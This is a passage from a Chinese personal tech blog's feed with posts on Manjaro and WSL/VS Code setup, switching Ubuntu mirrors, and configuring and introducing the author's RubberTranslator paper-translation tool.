QT_IM_MODULE&#x3D;fcitx</span><br></pre></td></tr></table></figure><p>注销重登录(或重启)。</p><p>rime 输入法配置，直接从自己的nutstore上拉下配置，放到 <code>~/.config/fcitx/rime</code>下，重新部署rime即可。</p><p>删除firefox。</p><ol start="2"><li>添加yay或yaourt 以aur。 或者manjaro自带的包管理gui工具也很好使用，手动打开aur就行。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S yay # 或yaourt</span><br></pre></td></tr></table></figure><ol start="3"><li>electron-ssr ， 这个就不说了，要想chrome同步，总得有个工具吧。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yay -S electron-ssr</span><br></pre></td></tr></table></figure><p>ok，有了上述软件，其余的就比较简单了。</p><ol start="4"><li>zsh &amp; on-my-zsh安装及终端配置</li></ol><p>参考：<a href="https://www.ravenxrz.ink/archives/6c55eca4.html">https://www.ravenxrz.ink/archives/6c55eca4.html</a></p><p>终端主要是配置 颜色方案和字体大小，按照个人喜好即可。</p><p>update: 个人将Breath2 换为 Breath。</p><p><img data-src="https://pic.downk.cc/item/5edda5ebc2a9a83be5dc28d1.png"></p><ol start="5"><li>netease-music, vscode及相关配置。</li></ol><p>vscode下载Settings Sync插件即可。</p><ol start="6"><li>redshift 安装</li></ol><p>linux下类似windows平台的flux软件，用于护眼。下载安装后，需要配置一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/geoclue/geoclue.conf </span><br><span class="line"><span class="meta">#</span><span class="bash"> 填写</span></span><br><span class="line">[redshift]</span><br><span class="line">allowed=true</span><br><span class="line">system=false</span><br><span class="line">users=</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.config/redshift</span><br><span class="line">vim ~/.config/redshift.conf</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 填写</span></span><br><span class="line">; Global settings for redshift</span><br><span class="line">[redshift]</span><br><span class="line">; Set the day and night screen temperatures</span><br><span class="line">temp-day=4300</span><br><span class="line">temp-night=3500</span><br></pre></td></tr></table></figure><ol start="7"><li>下载工具</li></ol><p>xdman ，类似于windows平台的idm</p><p>这个用manjaro自带的包管理工具下载。yay和yaourt我都build失败了，不知道为什么。</p><p>记得开启aur。</p><p><img data-src="https://pic.downk.cc/item/5edda47ec2a9a83be5d8d6bf.png"></p><p>和idm差不多，多线程下载，支持代理，支持视频抓取，集成浏览器插件，代理所有下载。very nice~。</p><p>update: xdman似乎不支持高分屏, 目前已更换为<strong>Persepolis</strong>.</p><ol start="8"><li>截图工具</li></ol><p>这里暂时用了deepin的截图工具，等待snipaste的linux版本。</p><p>安装:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S deepin-screenshot  </span><br></pre></td></tr></table></figure><p>update: 改用flameshot</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S flameshot</span><br></pre></td></tr></table></figure><p>下面的命令改用flameshot gui即可。</p><p>配置快捷键：</p><p><img data-src="https://pic.downk.cc/item/5edda503c2a9a83be5da0f25.png"></p><p>选custom shortcuts:</p><p><img data-src="https://pic.downk.cc/item/5edda561c2a9a83be5daf28a.png"></p><p><img data-src="https://pic.downk.cc/item/5edda59dc2a9a83be5db75d3.png"></p><ol start="9"><li><p>qq-linux，虽然及其简陋，但是也算能用。</p></li><li><p>剪切板历史配置</p><p>manjaro居然自带了这个功能，类似于windows下载ditto，超爱。</p><p><img data-src="https://pic.downk.cc/item/5edda7aac2a9a83be5e052f9.png"></p><p><img data-src="https://pic.downk.cc/item/5edda770c2a9a83be5dfdcad.png"></p></li></ol><p>剩下的就是按照自己喜好安装了。如：idea, pdf阅读器，git客户端等等。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本博文主要写给自己做记录，其它朋友也作为参考。&lt;/p&gt;
&lt;h2 id=&quot;1-更新源&quot;&gt;&lt;a href=&quot;#1-更新源&quot; class=&quot;headerlink&quot; title=&quot;1. 更新源&quot;&gt;&lt;/a&gt;1. 更新源&lt;/h2&gt;&lt;p&gt;安装任何linux发行版后（除非是国内开发的发行版，如deepin），第一步做的就是切换到国内源，manjaro也不例外:&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo pacman-mirrors -i -c China -m rank &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;添加archlinux源：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;suo &amp;#x2F;etc&amp;#x2F;pacman.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;## 中国科学技术大学 (ipv4, ipv6, http, https)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[archlinuxcn]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Server &amp;#x3D; https:&amp;#x2F;&amp;#x2F;mirrors.ustc.edu.cn&amp;#x2F;archlinuxcn&amp;#x2F;$arch&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;更新：&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo pacman -Syyu&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://www.ravenxrz.ink/categories/Linux/"/>
    
    
      <category term="manjaro" scheme="https://www.ravenxrz.ink/tags/manjaro/"/>
    
  </entry>
  
  <entry>
    <title>vscode+wsl搭建linux开发环境</title>
    <link href="https://www.ravenxrz.ink/archives/960b6cb.html"/>
    <id>https://www.ravenxrz.ink/archives/960b6cb.html</id>
    <published>2020-06-06T12:35:36.000Z</published>
    <updated>2020-09-06T07:37:36.768Z</updated>
    
    <content type="html"><![CDATA[<p>本篇博客仅写给自己做备份查看用。</p><p>背景：</p><ul><li>第n次放弃vscode又重新拾起，认真找了个系统视频看完后，现在感觉确实蛮香的；</li><li>开虚拟机做linux开发，对于我的旧笔记本来说太难受了；</li><li>windows 的 linux子系统尝鲜。</li></ul><a id="more"></a><h3 id="1-安装windows的linux子系统。"><a href="#1-安装windows的linux子系统。" class="headerlink" title="1.安装windows的linux子系统。"></a>1.安装windows的linux子系统。</h3><p>参考:<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy93c2wvaW5zdGFsbC13aW4xMA==" title="https://docs.microsoft.com/en-us/windows/wsl/install-win10">https://docs.microsoft.com/en-us/windows/wsl/install-win10<i class="fa fa-external-link"></i></span></p><p><strong>安装wsl2.</strong></p><p>尽量安装最新的系统，如ubuntu20.</p><p><strong>必要的配置：</strong></p><ul><li>换源，参考：<a href="https://www.ravenxrz.ink/archives/32b1479.html">https://www.ravenxrz.ink/archives/32b1479.html</a></li><li>安装必要组件，build-essential, cmake等。</li><li>安装必要vim插件，写点配置，小脚本需要vim。参考：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtaXgvdmltcmM=" title="https://github.com/amix/vimrc">https://github.com/amix/vimrc<i class="fa fa-external-link"></i></span></li><li>安装zsh和oh-my-zsh， 参考：<a href="https://www.ravenxrz.ink/archives/6c55eca4.html">https://www.ravenxrz.ink/archives/6c55eca4.html</a></li></ul><p>ok，基本需要的东西都搞定了。</p><h3 id="2-安装vscode"><a href="#2-安装vscode" class="headerlink" title="2. 安装vscode"></a>2. 安装vscode</h3><p>自行官网下载。</p><p>下载后第一步安装，Settings sync插件，把自己的设置从gist中拉下来。</p><p>从Remote-WSl插件slidebar中，打开wsl。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200606204430438.png" alt="image-20200606204430438"></p><p>然后就可以愉快的进行开发了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本篇博客仅写给自己做备份查看用。&lt;/p&gt;
&lt;p&gt;背景：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第n次放弃vscode又重新拾起，认真找了个系统视频看完后，现在感觉确实蛮香的；&lt;/li&gt;
&lt;li&gt;开虚拟机做linux开发，对于我的旧笔记本来说太难受了；&lt;/li&gt;
&lt;li&gt;windows 的 linux子系统尝鲜。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="杂文" scheme="https://www.ravenxrz.ink/categories/%E6%9D%82%E6%96%87/"/>
    
    
      <category term="开发工具" scheme="https://www.ravenxrz.ink/tags/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu通用换源方法</title>
    <link href="https://www.ravenxrz.ink/archives/32b1479.html"/>
    <id>https://www.ravenxrz.ink/archives/32b1479.html</id>
    <published>2020-06-06T12:28:36.000Z</published>
    <updated>2020-09-06T07:37:36.762Z</updated>
    
    <content type="html"><![CDATA[<p>一般来说，安装任何linux发行版后，我们做的第一步就是更换它的仓库源，然后才能愉快的下载各种东西。</p><p>这里就说一下ubuntu的通用换源方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 备份源source.list</span></span><br><span class="line">sudo cp /etc/apt/source.list /etc/apt/source.list.bak</span><br><span class="line"><span class="meta">#</span><span class="bash"> sed批量替换源地址</span></span><br><span class="line">sudo sed -i &#x27;s/^\(deb\|deb-src\) \([^ ]*\) \(.*\)/\1 http:\/\/mirrors.aliyun.com\/ubuntu \3/&#x27; /etc/apt/sources.list</span><br><span class="line"><span class="meta">#</span><span class="bash"> update 生效</span></span><br><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><p>ok， 就这么简单。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一般来说，安装任何linux发行版后，我们做的第一步就是更换它的仓库源，然后才能愉快的下载各种东西。&lt;/p&gt;
&lt;p&gt;这里就说一下ubuntu的通用换源方法：&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://www.ravenxrz.ink/categories/Linux/"/>
    
    
      <category term="换源" scheme="https://www.ravenxrz.ink/tags/%E6%8D%A2%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>RubberTranslator配置</title>
    <link href="https://www.ravenxrz.ink/archives/2d8a0c3e.html"/>
    <id>https://www.ravenxrz.ink/archives/2d8a0c3e.html</id>
    <published>2020-06-04T01:23:16.000Z</published>
    <updated>2020-09-06T07:37:36.759Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要讲解如何配置OCR，百度和有道APi。</p><p><strong>注意，如果设置后无法生效，重启应用即可。</strong></p><a id="more"></a><h2 id="1-OCR"><a href="#1-OCR" class="headerlink" title="1. OCR"></a>1. OCR</h2><p>打开RubberTranslator，高级设置-&gt;key&amp;secret设置,点击OCR：</p><p><img data-src="https://pic.downk.cc/item/5ed84835c2a9a83be5971c54.png" alt="image-20200516124027689"></p><p>会自动跳转到：</p><p><img data-src="https://pic.downk.cc/item/5ed84845c2a9a83be5972799.png" alt="image-20200516124127415"></p><p>点击控制台，登录你的百度账号，此时会自动跳转到后台控制界面，回到上一个界面：<span class="exturl" data-url="aHR0cHM6Ly9haS5iYWlkdS5jb20vdGVjaC9vY3I=" title="https://ai.baidu.com/tech/ocr">https://ai.baidu.com/tech/ocr<i class="fa fa-external-link"></i></span></p><p>然后点立即使用：</p><p><img data-src="https://pic.downk.cc/item/5ed84850c2a9a83be59730fa.png" alt="image-20200516124308315"></p><p><img data-src="https://pic.downk.cc/item/5ed84858c2a9a83be59737d3.png" alt="image-20200516124408885"></p><p><img data-src="https://pic.downk.cc/item/5ed8485fc2a9a83be597475e.png" alt="image-20200516124442158"></p><p><img data-src="https://pic.downk.cc/item/5ed84869c2a9a83be5975b18.png" alt="image-20200516124450449"></p><p>然后复制这两项：</p><p><img data-src="https://pic.downk.cc/item/5ed84873c2a9a83be59762e0.png" alt="image-20200516124554132"></p><p>填入到，RubberTranslator中即可：</p><p><img data-src="https://pic.downk.cc/item/5ed84c6ac2a9a83be59b336d.jpg" alt="image-20200516124622778"></p><h2 id="2-百度翻译配置"><a href="#2-百度翻译配置" class="headerlink" title="2. 百度翻译配置"></a>2. 百度翻译配置</h2><p>同样，高级设置-&gt;Key&amp;Secret设置-&gt;百度：</p><p><img data-src="https://pic.downk.cc/item/5ed84886c2a9a83be597705b.png" alt="image-20200516124941336"></p><p>自动跳转自：</p><p><img data-src="https://pic.downk.cc/item/5ed8488ec2a9a83be5977693.png" alt="image-20200516125023011"></p><p><img data-src="https://pic.downk.cc/item/5ed84894c2a9a83be5977b65.png" alt="image-20200516125135151"></p><p><img data-src="https://pic.downk.cc/item/5ed8489bc2a9a83be5978920.png" alt="image-20200516125159274"></p><p><img data-src="https://pic.downk.cc/item/5ed848a3c2a9a83be597977e.png" alt="image-20200516125239579"></p><p>开通完后，进入开发者信息，就会有APP ID 和密钥。复制两项到RubberTranslator中即可。</p><h2 id="3-有道翻译配置"><a href="#3-有道翻译配置" class="headerlink" title="3.  有道翻译配置"></a>3.  有道翻译配置</h2><p>有道翻译配置稍微多几步，同时有道翻译是收费的，但是注册就送50元，可以用蛮久的。</p><p><img data-src="https://pic.downk.cc/item/5ed848adc2a9a83be597a4c0.png" alt="image-20200516125348837"></p><p>自动跳转到：</p><p><img data-src="https://pic.downk.cc/item/5ed848b4c2a9a83be597aae1.png" alt="image-20200516125433100"></p><p>注册，登录：</p><p><img data-src="https://pic.downk.cc/item/5ed848bbc2a9a83be597b06b.png" alt="image-20200516125744654"></p><p><img data-src="https://pic.downk.cc/item/5ed848c2c2a9a83be597b67b.png" alt="image-20200516125805841"></p><p>然后点击：</p><p><img data-src="https://pic.downk.cc/item/5ed848c9c2a9a83be597bbec.png" alt="image-20200516130608627"></p><p><img data-src="https://pic.downk.cc/item/5ed848d0c2a9a83be597c176.png" alt="image-20200516125949882"></p><p><img data-src="https://pic.downk.cc/item/5ed848d7c2a9a83be597cf3e.png" alt="image-20200516130000694"></p><p><img data-src="https://pic.downk.cc/item/5ed848dec2a9a83be597dbca.png" alt="image-20200516130024180"></p><p><img data-src="https://pic.downk.cc/item/5ed848e4c2a9a83be597e3fb.png" alt="image-20200516130047228"></p><p>最后：</p><p><img data-src="https://pic.downk.cc/item/5ed848eac2a9a83be597e8d2.png" alt="image-20200516130130324"></p><p><img data-src="https://pic.downk.cc/item/5ed848f0c2a9a83be597edd9.png" alt="image-20200516130151980"></p><p>复制应用ID和密钥到RubberTranslator即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要讲解如何配置OCR，百度和有道APi。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意，如果设置后无法生效，重启应用即可。&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="项目" scheme="https://www.ravenxrz.ink/categories/%E9%A1%B9%E7%9B%AE/"/>
    
    
      <category term="RubberTranslator - 配置" scheme="https://www.ravenxrz.ink/tags/RubberTranslator-%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>论文辅助翻译软件--RubberTranslator</title>
    <link href="https://www.ravenxrz.ink/archives/a79932ef.html"/>
    <id>https://www.ravenxrz.ink/archives/a79932ef.html</id>
    <published>2020-05-22T01:37:19.000Z</published>
    <updated>2020-09-06T07:37:36.790Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>RubberTranslator是我在使用知云文献翻译和CopyTranslator两款软件后，基于javafx开发的一款文献辅助翻译软件。总体功能思想来自CopyTranslator，在此基础之上添加了自己觉得实用的功能。</p><p>开源地址:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L1J1YmJlclRyYW5zbGF0b3I=" title="https://github.com/ravenxrz/RubberTranslator">https://github.com/ravenxrz/RubberTranslator<i class="fa fa-external-link"></i></span></p><p><strong>安装：</strong></p><p>本项目目前仅支持Windows平台，Linux之后会支持，但是Mac平台由于本人没有Mac电脑，所以无法支持，但是java是跨平台的，所以有mac电脑又有兴趣的朋友可自行打包。</p><ol><li>点击<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L1J1YmJlclRyYW5zbGF0b3IvcmVsZWFzZXM=" title="https://github.com/ravenxrz/RubberTranslator/releases">Releases<i class="fa fa-external-link"></i></span>界面下载对应平台安装包即可。</li><li>考虑到github国内下载速度较慢，可从<span class="exturl" data-url="aHR0cHM6Ly9yYXZlbnhyei5sYW56b3VzLmNvbS9iMDFiZXpiY2Y=" title="https://ravenxrz.lanzous.com/b01bezbcf">这里下载<i class="fa fa-external-link"></i></span></li></ol><p><em>注：请勿安装在有中文路径的目录下</em></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMWFBNDExdDdwWQ==" title="https://www.bilibili.com/video/BV1aA411t7pY">点这里，看视频介绍<i class="fa fa-external-link"></i></span></p><a id="more"></a><h2 id="1-基础功能"><a href="#1-基础功能" class="headerlink" title="1. 基础功能"></a>1. 基础功能</h2><h3 id="1-1-手动翻译"><a href="#1-1-手动翻译" class="headerlink" title="1.1 手动翻译"></a>1.1 手动翻译</h3><p>作为翻译软件最基础的功能，RubberTranslator也是支持手动翻译的，如：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/oRsHcgsqvQ.gif"></p><h3 id="1-2-翻译引擎选择-amp-源-目标语言设置"><a href="#1-2-翻译引擎选择-amp-源-目标语言设置" class="headerlink" title="1.2 翻译引擎选择&amp;源/目标语言设置"></a>1.2 翻译引擎选择&amp;源/目标语言设置</h3><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/S24b0bnOaP.gif"></p><p>默认支持，谷歌翻译，百度翻译和有道翻译。（百度和有道翻译需要配置API信息才可以使用，详情可参看：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L1J1YmJlclRyYW5zbGF0b3Ivd2lraS9PQ1IlRUYlQkMlOEMlRTclOTklQkUlRTUlQkElQTYlRTUlOTIlOEMlRTYlOUMlODklRTklODElOTMlRTklODUlOEQlRTclQkQlQUU=" title="https://github.com/ravenxrz/RubberTranslator/wiki/OCR%EF%BC%8C%E7%99%BE%E5%BA%A6%E5%92%8C%E6%9C%89%E9%81%93%E9%85%8D%E7%BD%AE">ocr,百度，有道配置<i class="fa fa-external-link"></i></span></p><h3 id="1-3-文本格式化"><a href="#1-3-文本格式化" class="headerlink" title="1.3 文本格式化"></a>1.3 文本格式化</h3><p>文本格式化是用来做什么的呢？我们平常在阅读pdf文档的时候，经常有这样的一个问题，从pdf中拷贝的文本粘贴到其它地方会多出很多换行，如：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200515203036559.png"></p><p>可以看到，因为多出很多空行，翻译会变得非常的不准确，一般来说，我们会手动替换掉所有的换行符，RubberTranslator默认开启”文本格式化“功能，可以用来解决问题，在替换掉换行符的同时，<strong>尽量保持分段格式</strong>，功能展示：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/HpgwWgEwNd.gif"></p><p><em>注意：谷歌翻译引擎不支持保持分段格式。</em></p><h3 id="1-4-监听剪切板"><a href="#1-4-监听剪切板" class="headerlink" title="1.4 监听剪切板"></a>1.4 监听剪切板</h3><p>开启监听剪切板功能，只要PC剪贴板中有新文本或图片时，RubberTranslator会自动翻译，也就是说只要有”复制“(Ctrl+C或鼠标复制）动作，RubberTranslator就会复制。如：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/iasVDY9BIQ.gif"></p><h3 id="1-5-拖拽复制"><a href="#1-5-拖拽复制" class="headerlink" title="1.5 拖拽复制"></a>1.5 拖拽复制</h3><p>每次都手动进行复制显得过于麻烦，所以拖拽复制可以实现自动复制，拖拽复制在以下两种情况下会触发：</p><ol><li>鼠标双击；</li><li>鼠标点击-&gt;移动一定距离-&gt;释放。如果移动距离过近，则不会触发复制。</li></ol><p>配置监听剪切板功能，即可实现自动翻译。演示：</p><p>双击：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/bG2PZ7pfaF.gif"></p><p>拖拽：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/94VVcyPHtK.gif"></p><h3 id="1-6-自动复制"><a href="#1-6-自动复制" class="headerlink" title="1.6 自动复制"></a>1.6 自动复制</h3><p>自动复制用于自动复制译文，RubberTranslator在翻译完一段文本后，会自动将文本放入到系统剪切板中，此时用户通过”粘贴“功能即可在任何地方输入译文了。演示：</p><p><img data-src="https://pic.downk.cc/item/5ebf5073c2a9a83be588af19.gif"></p><h3 id="1-7-自动粘贴"><a href="#1-7-自动粘贴" class="headerlink" title="1.7 自动粘贴"></a>1.7 自动粘贴</h3><p>自动粘贴用于就地替换原文，如下：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/mYHGWcR1eQ.gif"></p><h3 id="1-8-增量复制"><a href="#1-8-增量复制" class="headerlink" title="1.8 增量复制"></a>1.8 增量复制</h3><p>增量复制用于解决阅读过程中，”文本翻页“的情况，如：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/AncXUT56Pq.gif"></p><h3 id="1-9-OCR翻译"><a href="#1-9-OCR翻译" class="headerlink" title="1.9 OCR翻译"></a>1.9 OCR翻译</h3><p>对于一些无法复制的pdf文本，可以通过ocr进行翻译，如：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/vI26MTVGa3.gif"></p><p>ocr功能需要配置百度ocr api key。<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L1J1YmJlclRyYW5zbGF0b3Ivd2lraS9PQ1IlRUYlQkMlOEMlRTclOTklQkUlRTUlQkElQTYlRTUlOTIlOEMlRTYlOUMlODklRTklODElOTMlRTklODUlOEQlRTclQkQlQUU=" title="https://github.com/ravenxrz/RubberTranslator/wiki/OCR%EF%BC%8C%E7%99%BE%E5%BA%A6%E5%92%8C%E6%9C%89%E9%81%93%E9%85%8D%E7%BD%AE">ocr,百度，有道配置<i class="fa fa-external-link"></i></span></p><h3 id="1-10-历史记录"><a href="#1-10-历史记录" class="headerlink" title="1.10 历史记录"></a>1.10 历史记录</h3><p>RubberTranslation也支持历史记录，默认支持10条内的记录，可在高级设置中进行修改。</p><h3 id="1-11-专注模式"><a href="#1-11-专注模式" class="headerlink" title="1.11 专注模式"></a>1.11 专注模式</h3><p>专注模式只保留译文，整体布局更为紧凑，适合在阅读论文时使用。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200515211515270.png"></p><h3 id="1-12-翻译接力"><a href="#1-12-翻译接力" class="headerlink" title="1.12 翻译接力"></a>1.12 翻译接力</h3><p>一直使用同一个翻译引擎时，可能会出现翻译失败的情况，在这种情况下，RubberTranslato会自动选择下一个翻译引擎进行翻译。</p><h2 id="2-高级设置"><a href="#2-高级设置" class="headerlink" title="2. 高级设置"></a>2. 高级设置</h2><h3 id="1-过滤器"><a href="#1-过滤器" class="headerlink" title="1. 过滤器"></a>1. 过滤器</h3><p>此功能暂时仅限Widnows平台。</p><p>过滤器用于设置不需要进行复制翻译的程序，考虑一个场景，在看论文时，我们需要在浏览器中搜寻一些资料，但是我们并不需要自动翻译浏览器中的内容，这时就可以将浏览器加入我们的过滤名单中。</p><p>操作：高级设置-&gt;过滤器,点击添加，找到浏览器的exe文件(快捷方式也可以）即可：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200515211034440.png"></p><h3 id="2-翻译文本替换"><a href="#2-翻译文本替换" class="headerlink" title="2. 翻译文本替换"></a>2. 翻译文本替换</h3><p>这个功能用于将译文中的特定词组替换为自己想要的词组，可以用于替换为专有名词。举个例子，在计算机数据结构或算法上，有一个术语叫做binary search，一般中文称为二分查找，而使用翻译引擎翻译，则会被翻译为二进制搜索，这让人非常的别扭。通过”翻译文本替换“功能，我们可以还原为二分查找。</p><p>先看，没有添加词组前：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/Gu9OkaJ3Q8.gif"></p><p>再看添加词组后：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/MD3Q6XYcnu.gif"></p><p><strong>支持java正则表达式。</strong></p><h3 id="3-历史记录数量设置"><a href="#3-历史记录数量设置" class="headerlink" title="3. 历史记录数量设置"></a>3. 历史记录数量设置</h3><p>可以设置历史记录的数量，历史记录并不会持久化到硬盘上，每次启动程序都会清空，所有历史记录都会保留在内存中，所以不建议将历史记录数量设置过大。</p><h3 id="4-自定义样式"><a href="#4-自定义样式" class="headerlink" title="4. 自定义样式"></a>4. 自定义样式</h3><p>RubberTranslator支持自定义css样式。 如，设置护眼模式，更改字体大小的css：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#main</span> &#123;</span><br><span class="line">    <span class="attribute">-fx-font-size</span>: <span class="number">10pt</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#focus</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.text-area</span> &#123;</span><br><span class="line"><span class="attribute">-fx-font-size</span>: <span class="number">10pt</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.text-area</span> <span class="selector-class">.content</span>&#123;</span><br><span class="line">    <span class="attribute">-fx-background-color</span>: <span class="built_in">rgb</span>(<span class="number">199</span>,<span class="number">237</span>,<span class="number">204</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200515212539191.png"></p><p>更多可设置效果，请参考</p><p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YWZ4LzIvYXBpL2phdmFmeC9zY2VuZS9kb2MtZmlsZXMvY3NzcmVmLmh0bWw=" title="https://docs.oracle.com/javafx/2/api/javafx/scene/doc-files/cssref.html">https://docs.oracle.com/javafx/2/api/javafx/scene/doc-files/cssref.html<i class="fa fa-external-link"></i></span></p><h3 id="5-OCR-百度和有道APi设置"><a href="#5-OCR-百度和有道APi设置" class="headerlink" title="5. OCR 百度和有道APi设置"></a>5. OCR 百度和有道APi设置</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L1J1YmJlclRyYW5zbGF0b3Ivd2lraS9PQ1IlRUYlQkMlOEMlRTclOTklQkUlRTUlQkElQTYlRTUlOTIlOEMlRTYlOUMlODklRTklODElOTMlRTklODUlOEQlRTclQkQlQUU=" 